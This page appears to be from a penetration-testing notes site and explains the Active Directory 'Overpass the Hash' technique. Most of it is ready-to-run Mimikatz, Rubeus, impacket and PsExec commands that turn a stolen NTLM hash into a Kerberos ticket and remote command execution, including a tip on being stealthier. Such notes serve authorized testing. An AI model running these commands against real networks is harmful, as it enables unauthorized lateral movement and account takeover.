---
layout: default
title: Overpass the Hash
parent: Active Directory
nav_order: 1
permalink: /ad/overpassthehash/
---

# Overpass the Hash
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

If you get the NTLM hash of a domain user, you can use it to request a Kerberos TGT. It is particularly useful in environements where NTLM is not enabled to lateralize through Kerberos authentication.

## Prerequisites

* Having the NTLM hash of a domain user.
* This user must have appropriate permissions on the target machine.

## Exploit

From Windows.

```powershell
# With Mimikatz.
sekurlsa::pth /user:$username /domain:$domain /ntlm:$hash /run:powershell

# TGT Kerberos ticket will be generated at this moment.
net use \\$target

# Using Rubeus (add /ptt if you directly want to inject the ticket in your current session).
.\Rubeus.exe asktgt /domain:$domain /user:$username /rc4:$hash /nowrap

# More stealthy since RC4 is deprecated.
.\Rubeus.exe asktgt /domain:$domain /user:$username /aes256:$hash /opsec /nowrap

# Now you can use PsExec.
.\PsExec.exe \\$target $cmd
```

From Kali.

```bash
# Get TGT with impacket.
impacket-getTGT $domain/$username -hashes :$hash

# Now you can use PSExec.
impacket-psexec $domain/$username@$target -k -no-pass
```

## Recommendations

- [ ] Nothing to do here, it is the normal behavior of Kerberos protocol.